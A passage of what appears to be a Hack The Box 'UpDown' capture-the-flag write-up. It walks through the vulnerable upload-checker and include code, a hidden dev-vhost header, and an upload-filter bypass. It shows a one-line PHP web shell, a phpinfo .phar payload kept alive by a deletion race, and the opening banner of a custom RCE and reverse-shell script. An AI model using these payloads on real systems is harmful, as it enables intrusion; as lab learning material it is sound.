font-style: inherit;">"/"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb7-39">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">!is_dir</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$dir</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)){</span></span>
<span id="cb7-40">        <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">mkdir</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$dir</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> 0770, true<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-41">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb7-42">  </span>
<span id="cb7-43">  <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Upload the file.</span></span>
<span id="cb7-44">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$final_path</span> = <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$dir</span>.<span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$file</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb7-45">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">move_uploaded_file</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_FILES</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'file'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">][</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'tmp_name'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">],</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$final_path</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-46">    </span>
<span id="cb7-47">  <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Read the uploaded file.</span></span>
<span id="cb7-48">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$websites</span> = explode<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"\n"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,file_get_contents</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$final_path</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">));</span></span>
<span id="cb7-49">    </span>
<span id="cb7-50">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">foreach</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$websites</span> as <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">){</span></span>
<span id="cb7-51">        <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=trim</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-52">        <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">!preg_match</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"#file://#i"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">!preg_match</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"#data://#i"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">!preg_match</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"#ftp://#i"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)){</span></span>
<span id="cb7-53">            <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$check</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=isitup</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-54">            <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$check</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">){</span></span>
<span id="cb7-55">                <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;center&gt;{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb7-56"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;font color='green'&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb7-57">            <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">}else{</span></span>
<span id="cb7-58">                <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;center&gt;{</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$site</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">}</span></span>
<span id="cb7-59"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">&lt;font color='red'&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb7-60">            <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span>   </span>
<span id="cb7-61">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">}else{</span></span>
<span id="cb7-62">            <span class="bu" style="color: null;
background-color: null;
font-style: inherit;">echo</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&lt;center&gt;&lt;font color='red'&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb7-63">        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb7-64">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span>
<span id="cb7-65">    </span>
<span id="cb7-66">  <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Delete the uploaded file.</span></span>
<span id="cb7-67">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">@unlink</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$final_path</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb7-68"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span></span></code></pre></div>
<p>Index.php:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cat</span> index.php</span>
<span id="cb8-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>b<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>This <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">is</span> only for developers<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/b<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb8-3"></span>
<span id="cb8-4"></span>
<span id="cb8-5"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>a <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">href</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"?page=admin"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>Admin <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Panel</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>/a<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb8-6"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?php</span></span>
<span id="cb8-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">define</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"DIRECTACCESS"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,false</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb8-8">    <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$page</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">=</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_GET</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'page'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb8-9">    <span class="cf" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">if</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$page</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">&amp;&amp;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">!preg_match</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"/bin|usr|home|var|etc/i"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$page</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)){</span></span>
<span id="cb8-10">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">include</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_GET</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'page'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span> . <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">".php"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb8-11">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">}else{</span></span>
<span id="cb8-12">        <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">include</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"checker.php"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span>
<span id="cb8-13">    <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">}</span>   </span>
<span id="cb8-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>No matter how much I try to get to anything else then <code>checker.php</code> it fails.. so instead of wasting more time, lets dig deeper into <code>.git</code></p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">git</span> log</span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">commit</span> 8812785e31c879261050e72e20f298ae8c43b565</span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Author:</span> Abdou.Y <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>84577967+ab2pentest@users.noreply.github.com<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb9-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Date:</span>   Wed Oct 20 16:38:54 2021 +0200</span>
<span id="cb9-6"></span>
<span id="cb9-7">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">New</span> technique in header to protect our dev vhost.</span>
<span id="cb9-8"></span>
<span id="cb9-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">commit</span> bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab</span>
<span id="cb9-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Author:</span> Abdou.Y <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>84577967+ab2pentest@users.noreply.github.com<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb9-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Date:</span>   Wed Oct 20 16:37:20 2021 +0200</span>
<span id="cb9-12"></span>
<span id="cb9-13">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Update</span> .htaccess</span>
<span id="cb9-14">    </span>
<span id="cb9-15">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">New</span> technique in header to protect our dev vhost.</span>
<span id="cb9-16"></span>
<span id="cb9-17"></span>
<span id="cb9-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  dev git:<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">main</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">git</span> diff bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab</span>
<span id="cb9-19"><span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">diff</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--git</span> a/.htaccess b/.htaccess</span>
<span id="cb9-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">index</span> 44ff240..b317ab5 100644</span>
<span id="cb9-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">---</span> a/.htaccess</span>
<span id="cb9-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+++</span> b/.htaccess</span>
<span id="cb9-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">@@</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-2,3</span> +2,4 @@ SetEnvIfNoCase Special-Dev <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"only4dev"</span> Required-Header</span>
<span id="cb9-24"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Order</span> Deny,Allow</span>
<span id="cb9-25"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Deny</span> from All</span>
<span id="cb9-26"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Allow</span> from env=Required-Header</span></code></pre></div>
<p>With this information, there should be a vhost named <code>dev</code> and we should reach it but using header <code>Special-Dev "only4dev"</code>. We can verify that this works with curl (<code>curl http://dev.siteisup.htb -H 'Special-Dev: only4dev'</code>), but if you want to view it in Firefox we can add a <strong>Session Handling Rule</strong> in Burp and invoke the extension <strong>Add Custom Header</strong>.</p>
<p>Burp Extension <em>Add Custom Header</em>:</p>
<p><img src="https://exploit.se/posts/2022-09-07-htb-writeup-updown/images/updown02.png" class="img-fluid"></p>
<p>Project Options &gt; Add <em>Session Handling Rules</em> &gt; <em>Invoke a Burp extension</em>:</p>
<p><img src="https://exploit.se/posts/2022-09-07-htb-writeup-updown/images/updown03.png" class="img-fluid"></p>
<p>Change <em>URL Scope</em> and add <em>Proxy</em> to <em>Tools Scope</em>, and you should now be able to browse <code>http://dev.siteisup.htb</code> and upload files:</p>
<p><img src="https://exploit.se/posts/2022-09-07-htb-writeup-updown/images/updown04.png" class="img-fluid"></p>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>We know from the source code (<code>checker.php</code>) that following extensions is blocked: <code>php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar</code>. We also have to adapt to the max file size of 10kb: <code>$_FILES['file']['size'] &gt; 10000</code> Lastly, the following wrappers are also blocked: <code>!preg_match("#file://#i",$site) &amp;&amp; !preg_match("#data://#i",$site) &amp;&amp; !preg_match("#ftp://#i",$site</code></p>
<p>Reading about <a href="https://book.hacktricks.xyz/pentesting-web/file-upload">file upload</a> on HackTricks these are listed as usefull extensions for PHP: <code>.php, .php2, .php3, .php4, .php5, .php6, .php7, .phps, .phps, .pht, .phtm, .phtml, .pgif, .shtml, .htaccess, .phar, .inc</code></p>
<p>Playing around and testing to upload stuff I am able to upload this file:</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  updown cat shell.pht</span>
<span id="cb10-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?php</span> echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Shell"</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">system</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$_GET</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'cmd'</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">]</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span></code></pre></div>
<p>However when looking in the uploads directory (<code>http://dev.siteisup.htb/uploads/</code>) a directory is created but no file is in the dir.. Going back to the code, this probably have something to do with below line from <code>checker.php</code>, that’s invoked after reading the uploaded file.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1">  <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># Delete the uploaded file.</span></span>
<span id="cb11-2">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">@unlink</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">$final_path</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span></span></code></pre></div>
<p>After a lot of playing around I noticed that when uploading a file, simply add some URL in the end of your code so the server will spend time to check if it’s up or not. This will keep the file alive long enough for us to see the content.</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  updown cat shell.phar </span>
<span id="cb12-2"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?php</span> phpinfo<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">);</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">?</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span></span>
<span id="cb12-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://exploit.se</span></span>
<span id="cb12-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">https://exploit.se</span></span></code></pre></div>
<p><img src="https://exploit.se/posts/2022-09-07-htb-writeup-updown/images/updown05.png" class="img-fluid"></p>
<p>The <code>disabled_functions</code> are as following:</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen</span></span></code></pre></div>
<p>Our normal one-line webshell are hurting since <code>system</code>, <code>passthru</code>, <code>shell_exec</code>, <code>exec</code>, <code>popen</code> and <code>pcntl_exec</code> are all disabled, however <code>proc_open</code> is not. Here’s a list of <a href="https://gist.github.com/mccabe615/b0907514d34b2de088c4996933ea1720">dangerous php functions</a>.</p>
<p>To stream line this process I wrote a script to write a malicious <code>.phar</code> file, upload the it to the target and gather the data. The script have two flags..</p>
<p>.. <code>-c</code> / <code>--command</code> for command injection</p>
<p>.. <code>-r</code> / <code>reverse</code> automatically trigger a reverse shell</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  updown python3 updown_rce.py <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-c</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"hostname &amp;&amp; id"</span></span>
<span id="cb14-2"></span>
<span id="cb14-3">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span>   _       ____                      </span>
<span id="cb14-4"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span> __ <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span>  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\ </span> _____      ___ __  </span>
<span id="cb14-5"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'_ \| | | |/ _ \ \ /\ / / '</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\ </span></span>
<span id="cb14-6"> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\ V</span>  V /<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb14-7">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\___/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">.__/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">____/</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\_</span>__/ <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\_</span>/\_/ <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
